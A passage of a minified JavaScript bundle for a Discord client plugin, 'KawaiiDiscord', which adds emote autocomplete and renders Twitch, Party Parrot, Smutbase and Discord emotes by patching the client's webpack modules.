t=e+"";return"0"==t&&1/e==-u?"-0":t}var o=e("./_Symbol"),i=e("./_arrayMap"),a=e("./isArray"),s=e("./isSymbol"),u=1/0,l=o?o.prototype:void 0,c=l?l.toString:void 0;t.exports=r},{"./_Symbol":6,"./_arrayMap":7,"./isArray":44,"./isSymbol":49}],13:[function(e,t,n){var r=e("./_root"),o=r["__core-js_shared__"];t.exports=o},{"./_root":38}],14:[function(e,t,n){(function(e){var n="object"==typeof e&&e&&e.Object===Object&&e;t.exports=n}).call(this,"undefined"!=typeof global?global:"undefined"!=typeof self?self:"undefined"!=typeof window?window:{})},{}],15:[function(e,t,n){function r(e,t){var n=e.__data__;return o(t)?n["string"==typeof t?"string":"hash"]:n.map}var o=e("./_isKeyable");t.exports=r},{"./_isKeyable":24}],16:[function(e,t,n){function r(e,t){var n=i(e,t);return o(n)?n:void 0}var o=e("./_baseIsNative"),i=e("./_getValue");t.exports=r},{"./_baseIsNative":11,"./_getValue":18}],17:[function(e,t,n){function r(e){var t=a.call(e,u),n=e[u];try{e[u]=void 0;var r=!0}catch(e){}var o=s.call(e);return r&&(t?e[u]=n:delete e[u]),o}var o=e("./_Symbol"),i=Object.prototype,a=i.hasOwnProperty,s=i.toString,u=o?o.toStringTag:void 0;t.exports=r},{"./_Symbol":6}],18:[function(e,t,n){function r(e,t){return null==e?void 0:e[t]}t.exports=r},{}],19:[function(e,t,n){function r(){this.__data__=o?o(null):{},this.size=0}var o=e("./_nativeCreate");t.exports=r},{"./_nativeCreate":36}],20:[function(e,t,n){function r(e){var t=this.has(e)&&delete this.__data__[e];return this.size-=t?1:0,t}t.exports=r},{}],21:[function(e,t,n){function r(e){var t=this.__data__;if(o){var n=t[e];return n===i?void 0:n}return s.call(t,e)?t[e]:void 0}var o=e("./_nativeCreate"),i="__lodash_hash_undefined__",a=Object.prototype,s=a.hasOwnProperty;t.exports=r},{"./_nativeCreate":36}],22:[function(e,t,n){function r(e){var t=this.__data__;return o?void 0!==t[e]:a.call(t,e)}var o=e("./_nativeCreate"),i=Object.prototype,a=i.hasOwnProperty;t.exports=r},{"./_nativeCreate":36}],23:[function(e,t,n){function r(e,t){var n=this.__data__;return this.size+=this.has(e)?0:1,n[e]=o&&void 0===t?i:t,this}var o=e("./_nativeCreate"),i="__lodash_hash_undefined__";t.exports=r},{"./_nativeCreate":36}],24:[function(e,t,n){function r(e){var t=typeof e;return"string"==t||"number"==t||"symbol"==t||"boolean"==t?"__proto__"!==e:null===e}t.exports=r},{}],25:[function(e,t,n){function r(e){return!!i&&i in e}var o=e("./_coreJsData"),i=function(){var e=/[^.]+$/.exec(o&&o.keys&&o.keys.IE_PROTO||"");return e?"Symbol(src)_1."+e:""}();t.exports=r},{"./_coreJsData":13}],26:[function(e,t,n){function r(){this.__data__=[],this.size=0}t.exports=r},{}],27:[function(e,t,n){function r(e){var t=this.__data__,n=o(t,e);if(n<0)return!1;var r=t.length-1;return n==r?t.pop():a.call(t,n,1),--this.size,!0}var o=e("./_assocIndexOf"),i=Array.prototype,a=i.splice;t.exports=r},{"./_assocIndexOf":8}],28:[function(e,t,n){function r(e){var t=this.__data__,n=o(t,e);return n<0?void 0:t[n][1]}var o=e("./_assocIndexOf");t.exports=r},{"./_assocIndexOf":8}],29:[function(e,t,n){function r(e){return o(this.__data__,e)>-1}var o=e("./_assocIndexOf");t.exports=r},{"./_assocIndexOf":8}],30:[function(e,t,n){function r(e,t){var n=this.__data__,r=o(n,e);return r<0?(++this.size,n.push([e,t])):n[r][1]=t,this}var o=e("./_assocIndexOf");t.exports=r},{"./_assocIndexOf":8}],31:[function(e,t,n){function r(){this.size=0,this.__data__={hash:new o,map:new(a||i),string:new o}}var o=e("./_Hash"),i=e("./_ListCache"),a=e("./_Map");t.exports=r},{"./_Hash":2,"./_ListCache":3,"./_Map":4}],32:[function(e,t,n){function r(e){var t=o(this,e).delete(e);return this.size-=t?1:0,t}var o=e("./_getMapData");t.exports=r},{"./_getMapData":15}],33:[function(e,t,n){function r(e){return o(this,e).get(e)}var o=e("./_getMapData");t.exports=r},{"./_getMapData":15}],34:[function(e,t,n){function r(e){return o(this,e).has(e)}var o=e("./_getMapData");t.exports=r},{"./_getMapData":15}],35:[function(e,t,n){function r(e,t){var n=o(this,e),r=n.size;return n.set(e,t),this.size+=n.size==r?0:1,this}var o=e("./_getMapData");t.exports=r},{"./_getMapData":15}],36:[function(e,t,n){var r=e("./_getNative"),o=r(Object,"create");t.exports=o},{"./_getNative":16}],37:[function(e,t,n){function r(e){return i.call(e)}var o=Object.prototype,i=o.toString;t.exports=r},{}],38:[function(e,t,n){var r=e("./_freeGlobal"),o="object"==typeof self&&self&&self.Object===Object&&self,i=r||o||Function("return this")();t.exports=i},{"./_freeGlobal":14}],39:[function(e,t,n){function r(e){if(null!=e){try{return i.call(e)}catch(e){}try{return e+""}catch(e){}}return""}var o=Function.prototype,i=o.toString;t.exports=r},{}],40:[function(e,t,n){function r(e,t,n){return void 0===n&&(n=t,t=void 0),void 0!==n&&(n=i(n),n=n===n?n:0),void 0!==t&&(t=i(t),t=t===t?t:0),o(i(e),t,n)}var o=e("./_baseClamp"),i=e("./toNumber");t.exports=r},{"./_baseClamp":9,"./toNumber":52}],41:[function(e,t,n){function r(e,t,n){function r(t){var n=y,r=x;return y=x=void 0,C=t,w=e.apply(r,n)}function c(e){return C=e,T=setTimeout(p,t),S?r(e):w}function f(e){var n=e-_,r=e-C,o=t-n;return j?l(o,b-r):o}function d(e){var n=e-_,r=e-C;return void 0===_||n>=t||n<0||j&&r>=b}function p(){var e=i();return d(e)?h(e):void(T=setTimeout(p,f(e)))}function h(e){return T=void 0,E&&y?r(e):(y=x=void 0,w)}function m(){void 0!==T&&clearTimeout(T),
    C=0,y=_=x=T=void 0}function v(){return void 0===T?w:h(i())}function g(){var e=i(),n=d(e);if(y=arguments,x=this,_=e,n){if(void 0===T)return c(_);if(j)return T=setTimeout(p,t),r(_)}return void 0===T&&(T=setTimeout(p,t)),w}var y,x,b,w,T,_,C=0,S=!1,j=!1,E=!0;if("function"!=typeof e)throw new TypeError(s);return t=a(t)||0,o(n)&&(S=!!n.leading,j="maxWait"in n,b=j?u(a(n.maxWait)||0,t):b,E="trailing"in n?!!n.trailing:E),g.cancel=m,g.flush=v,g}var o=e("./isObject"),i=e("./now"),a=e("./toNumber"),s="Expected a function",u=Math.max,l=Math.min;t.exports=r},{"./isObject":47,"./now":51,"./toNumber":52}],42:[function(e,t,n){function r(e,t){return e===t||e!==e&&t!==t}t.exports=r},{}],43:[function(e,t,n){function r(e){return e=o(e),e&&a.test(e)?e.replace(i,"\\$&"):e}var o=e("./toString"),i=/[\\^$.*+?()[\]{}|]/g,a=RegExp(i.source);t.exports=r},{"./toString":53}],44:[function(e,t,n){var r=Array.isArray;t.exports=r},{}],45:[function(e,t,n){function r(e){if(!i(e))return!1;var t=o(e);return t==s||t==u||t==a||t==l}var o=e("./_baseGetTag"),i=e("./isObject"),a="[object AsyncFunction]",s="[object Function]",u="[object GeneratorFunction]",l="[object Proxy]";t.exports=r},{"./_baseGetTag":10,"./isObject":47}],46:[function(e,t,n){function r(e){return null==e}t.exports=r},{}],47:[function(e,t,n){function r(e){var t=typeof e;return null!=e&&("object"==t||"function"==t)}t.exports=r},{}],48:[function(e,t,n){function r(e){return null!=e&&"object"==typeof e}t.exports=r},{}],49:[function(e,t,n){function r(e){return"symbol"==typeof e||i(e)&&o(e)==a}var o=e("./_baseGetTag"),i=e("./isObjectLike"),a="[object Symbol]";t.exports=r},{"./_baseGetTag":10,"./isObjectLike":48}],50:[function(e,t,n){function r(e,t){if("function"!=typeof e||null!=t&&"function"!=typeof t)throw new TypeError(i);var n=function(){var r=arguments,o=t?t.apply(this,r):r[0],i=n.cache;if(i.has(o))return i.get(o);var a=e.apply(this,r);return n.cache=i.set(o,a)||i,a};return n.cache=new(r.Cache||o),n}var o=e("./_MapCache"),i="Expected a function";r.Cache=o,t.exports=r},{"./_MapCache":5}],51:[function(e,t,n){var r=e("./_root"),o=function(){return r.Date.now()};t.exports=o},{"./_root":38}],52:[function(e,t,n){function r(e){if("number"==typeof e)return e;if(i(e))return a;if(o(e)){var t="function"==typeof e.valueOf?e.valueOf():e;e=o(t)?t+"":t}if("string"!=typeof e)return 0===e?e:+e;e=e.replace(s,"");var n=l.test(e);return n||c.test(e)?f(e.slice(2),n?2:8):u.test(e)?a:+e}var o=e("./isObject"),i=e("./isSymbol"),a=NaN,s=/^\s+|\s+$/g,u=/^[-+]0x[0-9a-f]+$/i,l=/^0b[01]+$/i,c=/^0o[0-7]+$/i,f=parseInt;t.exports=r},{"./isObject":47,"./isSymbol":49}],53:[function(e,t,n){function r(e){return null==e?"":o(e)}var o=e("./_baseToString");t.exports=r},{"./_baseToString":12}],54:[function(e,t,n){"use strict";function r(e){return e&&e.__esModule?e:{default:e}}function o(e,t){var n=m.exec(t);if(null===n)return{completions:[],matchText:null,matchStart:-1};var r=":"===n[2]?d.default.emoteStyle.STANDARD:d.default.emoteStyle.TWITCH,o=void 0!==n[4]||void 0!==n[6],i={start:o&&void 0===n[4],end:o&&void 0===n[6],numeric:o&&"#"===n[6]},a=e.filter(function(e){return e.emoteStyle===r}).filter(function(e){return e.rolls||!o}).map(function(e){return e.search(n[5],i).map(function(t){return[[n[2]+t[0]+n[2],e.createEmote.bind(e,t[0])],t[1]]})}).reduce(function(e,t){return e.concat(t)},[]).sort(y).map(function(e){return e[0]}),s=n[2]+n[3],u=n.index+n[1].length;return{completions:a,matchText:s,matchStart:u}}Object.defineProperty(n,"__esModule",{value:!0});var i=e("lodash/clamp"),a=r(i),s=e("lodash/debounce"),u=r(s),l=e("jquery"),c=r(l),f=e("./emoteset"),d=r(f),p=e("./internals"),h=/(^|\s)(?!$)(:?)(([*])?([\w~]*)([*#])?)$/,m=/(^|\s)(?!.{0,2}$)(:?)(([*])?([\w~]*)([*#])?)$/,v=/(^|\s)(?!.{0,2}$):(([*])?([\w~]+)([*#])?)$/,g=/(^|\s)(?!.{0,2}$)(([*])?([\w~]+)([*#])?)$/,y=function(){var e=new Intl.Collator((void 0),{usage:"sort",sensitivity:"base",numeric:!0}).compare;return function(t,n){return t[1]===n[1]?e(t[0],n[0]):t[1]-n[1]}}(),x=v.test.bind(v),b=(g.test.bind(g),m.test.bind(m)),w=h.test.bind(h),T={};n.default=T;var _=null;T.start=function(e){function t(e){var t=arguments.length>1&&void 0!==arguments[1]?arguments[1]:{},n=t.locked,r=void 0!==n&&n,o=t.clamped,i=void 0!==o&&o,s=d,u=s.completions,l=s.selectedIndex,c=s.windowOffset;if(void 0!==u&&0!==u.length){var f=u.length,p=l+e;p=i?(0,a.default)(p,0,f-1):p%f+(p<0?f:0),d.selectedIndex=p;var h=(0,a.default)(p+v-(m-1),0,f-m),y=(0,a.default)(p-v,0,f-m);d.windowOffset=(0,a.default)(c+(r?e:0),h,y),g(),g.flush()}}function n(){var t=h.value.slice(0,h.selectionEnd),n=d,r=n.candidateText;if(r!==t){var i=o(e,t),a=i.completions,s=i.matchText,u=i.matchStart;d={candidateText:t,completions:a,matchText:s,matchStart:u,selectedIndex:0,windowOffset:0}}var l=d,c=l.completions;return void 0!==c&&0!==c.length}function r(){var e=(0,c.default)(h).closest(".channelTextArea-1LDbYG > .inner-zqa7da"),t=e.children(".kawaii-autocomplete");t.remove(),d={},g.cancel()}function i(){var e=d,t=e.completions,n=e.matchStart,o=e.selectedIndex;void 0!==t&&(h.focus(),h.selectionStart=n,document.execCommand("insertText",!1,t[o][0]+" ")||(h.setRangeText(t[o][0]+" "),h.selectionStart=h.selectionEnd,h.dispatchEvent(new Event("input",{bubbles:!0}))),r())}function s(e){h=this;var t=h.value.slice(0,h.selectionEnd),o=d,i=o.candidateText;return w(t)?void((13!==e.which||x(t)&&n())&&(e.stopPropagation(),i!==t&&g())):void r()}function l(e){h=this;var r=h.value.slice(0,h.selectionEnd);if(b(r)){var o=0,a=void 0;switch(e.which){case 13:if(!x(r))break;case 9:if(!n())break;e.stopPropagation(),e.preventDefault(),i();break;case 38:o=-1;break;case 40:o=1;break;case 33:o=-m,a={locked:!0,clamped:!0};break;case 34:o=m,a={locked:!0,clamped:!0}}0!==o&&n()&&(e.stopPropagation(),e.preventDefault(),t(o,a))}}function f(e,r){var o=Math.sign(e.originalEvent.deltaY);0!==o&&n()&&(e.stopPropagation(),e.preventDefault(),t(o,r))}var d={},h=void 0,m=10,v=2,g=(0,u.default)(function(){var e=(0,c.default)(h).closest(".channelTextArea-1LDbYG > .inner-zqa7da"),t=e.children(".kawaii-autocomplete"),r=h.value.slice(0,h.selectionEnd);if(!b(r)||!n())return void t.remove();var o=d,a=o.completions,s=o.matchText,u=o.selectedIndex,l=o.windowOffset,p=a.slice(l,l+m),v=(0,c.default)("<div>").addClass("autocomplete-1vrmpx autocomplete-i9yVHs kawaii-autocomplete").on("wheel.kawaii-complete",function(e){return f(e,{locked:!0})}),g=(0,c.default)("<div>").addClass("autocompleteInner-zh20B_").appendTo(v);(0,c.default)("<div>",{class:"autocompleteRowVertical-q1K4ky autocompleteRow-20thDa"}).append((0,c.default)("<div>",{class:"selector-2IcQBU"}).append((0,c.default)("<div>",{text:"Emotes matching "}).append((0,c.default)("<strong>",{text:s})).addClass("contentTitle-2tG_sM small-29zrCQ size12-3R0845 height16-2Lv3qA weightSemiBold-NJexzi"))).appendTo(g),g.append(p.map(function(e,t){var n=(0,c.default)("<div>",{class:"autocompleteRowVertical-q1K4ky autocompleteRow-20thDa"}),r=(0,c.default)("<div>",{class:"selector-2IcQBU selectable-3dP3y-"}).append((0,c.default)("<div>").addClass("flex-1xMQg5 flex-1O1GKY horizontal-1ae9ci horizontal-2EEEnY flex-1O1GKY directionRow-3v3tfG justifyStart-2NDFzi alignCenter-1dQNNs noWrap-3jynv6 content-Qb0rXO").css("flex","1 1 auto").append(e[1]().toggleClass("emoji icon-3ZzoN7")).append((0,c.default)("<div>",{class:"marginLeft8-1YseBe",text:e[0]}))).appendTo(n);return t+l===u&&r.addClass("selectorSelected-1_M1WV"),n.on("mouseenter.kawaii-complete",function(e){d.selectedIndex=t+l,n.siblings().children(".selectorSelected-1_M1WV").removeClass("selectorSelected-1_M1WV"),n.children().addClass("selectorSelected-1_M1WV")}).on("mousedown.kawaii-complete",function(e){d.selectedIndex=t+l,i(),e.preventDefault()}),n})),t.remove(),e.append(v)},250);(0,c.default)("#app-mount").on({"keyup.kawaii-complete keypress.kawaii-complete click.kawaii-complete":s,"keydown.kawaii-complete":l,"wheel.kawaii-complete":f,"blur.kawaii-complete":r},".channelTextArea-1LDbYG textarea");var y=p.WebpackModules.find(function(e){return e.prototype&&e.prototype.maybeShowAutocomplete});return y?void(_=(0,p.monkeyPatch)(y.prototype,"maybeShowAutocomplete",{instead:function(e){var t=e.thisObject.props.value,n=e.thisObject._ref.selectionEnd;if(!w(t.slice(0,n)))return e.callOriginalMethod()}})):void console.warn("unable to monkey patch maybeShowAutocomplete method")},T.stop=function(){(0,c.default)("#app-mount").off(".kawaii-complete",".channelTextArea-1LDbYG textarea"),_&&(_(),_=null)}},{"./emoteset":56,"./internals":61,jquery:1,"lodash/clamp":40,"lodash/debounce":41}],55:[function(e,t,n){"use strict";function r(e){return e&&e.__esModule?e:{default:e}}function o(e){if(Array.isArray(e)){for(var t=0,n=Array(e.length);t<e.length;t++)n[t]=e[t];return n}return Array.from(e)}function i(e,t){if(!(e instanceof t))throw new TypeError("Cannot call a class as a function")}Object.defineProperty(n,"__esModule",{value:!0});var a=e("lodash/escapeRegExp"),s=r(a),u=e("lodash/memoize"),l=r(u),c=function(){function e(e,t){var n=[],r=!0,o=!1,i=void 0;try{for(var a,s=e[Symbol.iterator]();!(r=(a=s.next()).done)&&(n.push(a.value),!t||n.length!==t);r=!0);}catch(e){o=!0,i=e}finally{try{!r&&s.return&&s.return()}finally{if(o)throw i}}return n}return function(t,n){if(Array.isArray(t))return t;if(Symbol.iterator in Object(t))return e(t,n);throw new TypeError("Invalid attempt to destructure non-iterable instance")}}(),f=function(){function e(e,t){for(var n=0;n<t.length;n++){var r=t[n];r.enumerable=r.enumerable||!1,r.configurable=!0,"value"in r&&(r.writable=!0),Object.defineProperty(e,r.key,r)}}return function(t,n,r){return n&&e(t.prototype,n),r&&e(t,r),t}}(),d=e("jquery"),p=r(d),h=/^([*])?(\w*)([*#])?$/,m=function(){function e(){var t=arguments.length>0&&void 0!==arguments[0]?arguments[0]:{},n=t.label,r=t.template,o=t.caseSensitive,a=void 0===o||o,s=t.sizes,u=t.rolls,c=void 0!==u&&u,f=t.rollDefault,d=t.emoteStyle,p=void 0===d?e.emoteStyle.STANDARD:d,h=t.loader,m=void 0===h?function(){}:h;i(this,e),Object.assign(this,{label:n,template:r,caseSensitive:a,sizes:s,rolls:c,rollDefault:f,emoteStyle:p,loader:m}),this.getRollTable=(0,l.default)(this.getRollTable),this.emoteMap=new Map}return f(e,[{key:"load",value:function(){var e=this,t=Promise.resolve(this.loader()).then(function(t){return Object.assign(e,t)});return t.then(function(t){var n=t.loaded,r=t.skipped;console.info("KawaiiDiscord: "+e.label+" loaded: "+n+", skipped: "+r)}).catch(function(t){console.warn("KawaiiDiscord: "+e.label+" failed to load: "+t)}),t}},{key:"getEmote",value:function(e,t){if(this.caseSensitive||(e=e.toLowerCase()),this.rolls){var n=h.exec(e);if(null===n)return;if(void 0!==n[1]||void 0!==n[3]){var r=this.getRollTable(e);if(0===r.length)return;e=void 0===t||0===t?this.rollDefault:r[t%r.length]}}return this.emoteMap.get(e)}},{key:"createEmote",value:function(e,t){var n=this.getEmote(e,t);if(void 0!==n)return n.render(e)}},{key:"getRollTable",value:function(e){var t=h.exec(e),n={start:void 0===t[1],end:void 0===t[3],numeric:"#"===t[3]};return this.search(t[2],n).map(function(e){return e[0]}).sort()}},{key:"search",value:function(e){var t=arguments.length>1&&void 0!==arguments[1]?arguments[1]:{},n=t.start,r=void 0!==n&&n,i=t.end,a=void 0!==i&&i,u=t.numeric,l=void 0!==u&&u,c=r?"^":"",f=a?"$":l?"\\d*$":"",d=new RegExp(c+(0,s.default)(e)+f,"i"),p=function(t){var n=t.length-e.length,r=d.exec(t);if(null===r)return 0;var o=r.index;return 1+(o+1)*(n-o+2)};return[].concat(o(this.emoteMap.keys())).map(function(e){return[e,p(e)]}).filter(function(e){return 0!==e[1]})}}]),e}();n.default=m,m.emoteStyle={STANDARD:0,TWITCH:1},m.templateField={PATH:0,SIZE:1};m.Emote=function(){function e(){var t=arguments.length>0&&void 0!==arguments[0]?arguments[0]:{},n=t.name,r=t.path,o=t.emoteSet,a=void 0===o?null:o;i(this,e),Object.assign(this,{name:n,path:r,emoteSet:a})}return f(e,[{key:"getUrl",value:function(){var e=this,t=arguments.length>0&&void 0!==arguments[0]?arguments[0]:{},n=t.size,r=void 0===n?"1":n;return this.emoteSet&&this.emoteSet.template?this.emoteSet.template.replace(/{(\d+)}/g,function(t,n){switch(Number(n)){case m.templateField.PATH:return e.path;case m.templateField.SIZE:return r;default:return t}}):this.path}},{key:"render",value:function(e){e||(e=this.name),this.emoteSet.emoteStyle===m.emoteStyle.STANDARD&&(e=":"+e+":");var t=(0,p.default)("<img>",{src:this.src,srcSet:this.srcSet,draggable:"false",alt:e,title:e,class:"emoji kawaii-parseemotes"});return t}},{key:"src",get:function(){return this.getUrl()}},{key:"srcSet",get:function(){var e=this;return this.emoteSet&&this.emoteSet.sizes?this.emoteSet.sizes.map(function(t){var n=c(t,2),r=n[0],o=n[1];return e.getUrl({size:o})+" "+r}).join(","):null}}]),e}()},{jquery:1,"lodash/escapeRegExp":43,"lodash/memoize":50}],56:[function(e,t,n){"use strict";function r(e){return e&&e.__esModule?e:{default:e}}Object.defineProperty(n,"__esModule",{value:!0});var o=e("./emoteset");Object.defineProperty(n,"default",{enumerable:!0,get:function(){return r(o).default}})},{"./emoteset":55}],57:[function(e,t,n){"use strict";function r(e){return e&&e.__esModule?e:{default:e}}Object.defineProperty(n,"__esModule",{value:!0}),n.partyParrotEmotes=void 0;var o=e("lodash/memoize"),i=r(o),a=e("jquery"),s=r(a),u=e("./emoteset"),l=r(u);n.partyParrotEmotes=new l.default({label:"Party Parrot emotes",template:"https://gitcdn.xyz/repo/jmhobbs/cultofthepartyparrot.com/master/parrots/{0}",caseSensitive:!1,emoteStyle:l.default.emoteStyle.STANDARD,loader:function(){var e=this;return new Promise(function(t,n){s.default.ajax("https://gitcdn.xyz/repo/jmhobbs/cultofthepartyparrot.com/master/parrots.json",{dataType:"json",jsonp:!1,cache:!0}).done(function(n){var r={loaded:0,skipped:0};r.emoteMap=new Map,n.forEach(function(t){var n=void 0,o=void 0;void 0!==t.hd?(n=t.hd.slice(3,-4),o=t.hd):(n=t.gif.slice(0,-4),o=t.gif);var i=n.toLowerCase();r.emoteMap.set(i,new l.default.Emote({name:n,path:o,emoteSet:e})),r.loaded++}),r.getRollTable=(0,i.default)(l.default.prototype.getRollTable),t(r)}).fail(function(e,t,r){n(new Error(t+", error: "+r))})})}})},{"./emoteset":55,jquery:1,"lodash/memoize":50}],58:[function(e,t,n){"use strict";function r(e){return e&&e.__esModule?e:{default:e}}Object.defineProperty(n,"__esModule",{value:!0}),n.smutbaseEmotes=void 0;var o=e("lodash/memoize"),i=r(o),a=e("jquery"),s=r(a),u=e("./emoteset"),l=r(u);n.smutbaseEmotes=new l.default({label:"Smutbase emotes",template:"https://smutba.se/media/emoji/{0}",caseSensitive:!1,rolls:!0,rollDefault:"mikeroll",emoteStyle:l.default.emoteStyle.STANDARD,loader:function(){var e=this;return new Promise(function(t,n){s.default.ajax("https://smutba.se/emoji/json/",{dataType:"json",jsonp:!1,cache:!0}).done(function(n){var r={loaded:0,skipped:0};r.template=n.template,r.emoteMap=new Map,n.emotes.forEach(function(t){var n=t.name.toLowerCase();r.emoteMap.set(n,new l.default.Emote({name:t.name,path:t.url,emoteSet:e})),r.loaded++}),r.getRollTable=(0,i.default)(l.default.prototype.getRollTable),t(r)}).fail(function(e,t,r){n(new Error(t+", error: "+r))})})}})},{"./emoteset":55,jquery:1,"lodash/memoize":50}],59:[function(e,t,n){"use strict";function r(e){return e&&e.__esModule?e:{default:e}}function o(e){if(Array.isArray(e)){for(var t=0,n=Array(e.length);t<e.length;t++)n[t]=e[t];return n}return Array.from(e)}Object.defineProperty(n,"__esModule",{value:!0}),n.discordEmoji=void 0;var i=e("./emoteset"),a=r(i),s=e("../internals");n.discordEmoji=new a.default({label:"Discord emoji",template:"{0}",emoteStyle:a.default.emoteStyle.STANDARD,loader:function(){var e=this;return new Promise(function(t,n){window.setTimeout(function(){var r=s.WebpackModules.findByUniqueProperties(["getGuildEmoji","search"]),i=s.WebpackModules.findByUniqueProperties(["getChannel","getChannels"]),u=s.WebpackModules.findByUniqueProperties(["getChannelId","getVoiceChannelId"]);if(!(r&&i&&u))return void n(new Error("unable to find webpack modules"));var l=function(){return i.getChannel(u.getChannelId())},c=function(e){return r.search(l(),e)},f=new Map,d=function(t){var n=function(e){var n=e.length-t.length,r=e.toLowerCase().indexOf(t.toLowerCase());return r<0?1/0:1+(r+1)*(n-r+2)},r=function(e){return e.names?Math.min.apply(Math,o(e.names.map(n))):n(e.name)},i=c(t);return i.forEach(function(t){f.set(t.name,new a.default.Emote({name:t.name,path:t.url,emoteSet:e}))}),i.map(function(e){return[e.name,r(e)]})};t({emoteMap:f,search:d,loaded:0,skipped:0})},1e3)})}})},{"../internals":61,"./emoteset":55}],60:[function(e,t,n){"use strict";function r(e){return e&&e.__esModule?e:{default:e}}function o(e){return/^\w{3,}$/.test(e)&&/[A-Z]/.test(e)}Object.defineProperty(n,"__esModule",{value:!0}),n.twitchSubEmotes=n.twitchEmotes=void 0;var i=e("jquery"),a=r(i),s=e("./emoteset"),u=r(s);n.twitchEmotes=new u.default({label:"Twitch global emotes",template:"https://static-cdn.jtvnw.net/emoticons/v1/{0}/{1}.0",sizes:[["2x","2"],["4x","3"]],emoteStyle:u.default.emoteStyle.TWITCH,loader:function(){var e=this;return new Promise(function(t,n){a.default.ajax("https://api.twitch.tv/kraken/chat/emoticon_images?emotesets=0",{accepts:{json:"application/vnd.twitchtv.v3+json"},headers:{"Client-ID":"a7pwjx1l6tr0ygjrzafhznzd4zgg9md"},dataType:"json",jsonp:!1,cache:!0}).done(function(n){var r={loaded:0,skipped:0};r.emoteMap=new Map,n.emoticon_sets[0].forEach(function(t){o(t.code)?(r.emoteMap.set(t.code,new u.default.Emote({name:t.code,path:t.id,emoteSet:e})),r.loaded++):r.skipped++}),t(r)}).fail(function(e,t,r){n(new Error(t+", error: "+r))})})}}),n.twitchSubEmotes=new u.default({label:"Twitch subscriber emotes",template:"https://static-cdn.jtvnw.net/emoticons/v1/{0}/{1}.0",sizes:[["2x","2"],["4x","3"]],emoteStyle:u.default.emoteStyle.TWITCH,loader:function(){var e=this;return new Promise(function(t,n){a.default.ajax("https://api.twitch.tv/kraken/chat/emoticon_images",{accepts:{json:"application/vnd.twitchtv.v3+json"},headers:{"Client-ID":"a7pwjx1l6tr0ygjrzafhznzd4zgg9md"},dataType:"json",jsonp:!1,cache:!0}).done(function(n){var r={loaded:0,skipped:0};r.emoteMap=new Map,n.emoticons.forEach(function(t){null!==t.emoticon_set&&o(t.code)?(r.emoteMap.set(t.code,new u.default.Emote({name:t.code,path:t.id,emoteSet:e})),r.loaded++):r.skipped++}),t(r)}).fail(function(e,t,r){n(new Error(t+", error: "+r))})})}})},{"./emoteset":55,jquery:1}],61:[function(e,t,n){"use strict";Object.defineProperty(n,"__esModule",{value:!0});n.monkeyPatch=function(e,t,n){var r=n.before,o=n.after,i=n.instead,a=n.once,s=void 0!==a&&a,u=n.silent,l=void 0!==u&&u,c=n.displayName||e.displayName||e.name||e.constructor.displayName||e.constructor.name;l||console.log("patch",t,"of",c);var f=e[t],d=function(){l||console.log("unpatch",t,"of",c),e[t]=f};return e[t]=function(){var e={thisObject:this,methodArguments:arguments,cancelPatch:d,originalMethod:f,callOriginalMethod:function(){return e.returnValue=e.originalMethod.apply(e.thisObject,e.methodArguments)}};if(i){var t=i(e);void 0!==t&&(e.returnValue=t)}else r&&r(e),e.callOriginalMethod(),o&&o(e);return s&&d(),e.returnValue},e[t].__monkeyPatched=!0,e[t].displayName="patched "+(e[t].displayName||t),d},n.WebpackModules=function(){var e="function"==typeof webpackJsonp?webpackJsonp([],{__extra_id__:function(e,t,n){return t.default=n}},["__extra_id__"]).default:webpackJsonp.push([[],{__extra_id__:function(e,t,n){return e.exports=n}},[["__extra_id__"]]]);delete e.m.__extra_id__,delete e.c.__extra_id__;var t=function(t){var n=arguments.length>1&&void 0!==arguments[1]?arguments[1]:{},r=n.cacheOnly,o=void 0===r||r;for(var i in e.c)if(e.c.hasOwnProperty(i)){var a=e.c[i].exports;if(a&&a.__esModule&&a.default&&t(a.default))return a.default;if(a&&t(a))return a}if(o)return console.warn("Cannot find loaded module in cache"),null;console.warn("Cannot find loaded module in cache. Loading all modules may have unexpected side effects");for(var s=0;s<e.m.length;++s){var u=e(s);if(u&&u.__esModule&&u.default&&t(u.default))return u.default;if(u&&t(u))return u}return console.warn("Cannot find module"),null},n=function(e,n){return t(function(t){return e.every(function(e){return void 0!==t[e]})},n)},r=function(e,n){return t(function(t){return t.displayName===e},n)};return{find:t,findByUniqueProperties:n,findByDisplayName:r}}()},{}],62:[function(e,t,n){"use strict";function r(e){return e&&e.__esModule?e:{default:e}}function o(e){if(void 0!==e)try{return(0,x.getOwnerInstance)(e,{include:["Message"]}).memoizedProps}catch(e){return}}function i(e){try{return Number(o(e).message.id.slice(0,-6))>>>2}catch(t){return console.error("getMessageSeed:",e,t),0}}function a(e){var t=["#app-mount>:not(.tooltips)"].join(","),n=!0,r=!1,o=void 0;try{for(var i,a=document.querySelectorAll(t)[Symbol.iterator]();!(n=(i=a.next()).done);n=!0){var s=i.value;e.observe(s,{childList:!0,subtree:!0,characterData:!0})}}catch(e){r=!0,o=e}finally{try{!n&&a.return&&a.return()}finally{if(r)throw o}}}function s(e){e.disconnect()}function u(e,t){var n=[".markup-2BOw-j",".message-content",".topic-TCb_qw.expandable-9fI_e3",".content-8biNdB.selectable"].join(","),r=(0,b.mutationFind)(e,n).not(":has(.message-content)");s(t);var o=(0,h.default)(".messages"),i=o.scrollBottom()<.5;r.parseEmotes([T.smutbaseEmotes,_.partyParrotEmotes,w.twitchEmotes,w.twitchSubEmotes]).find(".kawaii-parseemotes").fancyTooltip(),(0,b.mutationFindRemoved)(e,".kawaii-fancytooltip").trigger("mouseout.fancyTooltip"),i&&o.scrollBottom(0),a(t)}function l(e){var t=[],n=[],r=[],o=!0,i=!1,a=void 0;try{for(var s,u=e[Symbol.iterator]();!(o=(s=u.next()).done);o=!0){var l=s.value;t.push(l.target);var c=!0,f=!1,d=void 0;try{for(var p,h=l.addedNodes[Symbol.iterator]();!(c=(p=h.next()).done);c=!0){var m=p.value;n.push(m)}}catch(e){f=!0,d=e}finally{try{!c&&h.return&&h.return()}finally{if(f)throw d}}var v=!0,g=!1,y=void 0;try{for(var x,b=l.removedNodes[Symbol.iterator]();!(v=(x=b.next()).done);v=!0){var w=x.value;r.push(w)}}catch(e){g=!0,y=e}finally{try{!v&&b.return&&b.return()}finally{if(g)throw y}}}}catch(e){i=!0,a=e}finally{try{!o&&u.return&&u.return()}finally{if(i)throw a}}return{target:t,addedNodes:n,removedNodes:r}}function c(){u({addedNodes:[document]},S)}function f(){w.twitchEmotes.load().then(c),T.smutbaseEmotes.load().then(c),_.partyParrotEmotes.load().then(c),C.discordEmoji.load()}function d(){}Object.defineProperty(n,"__esModule",{value:!0}),n.default=d;var 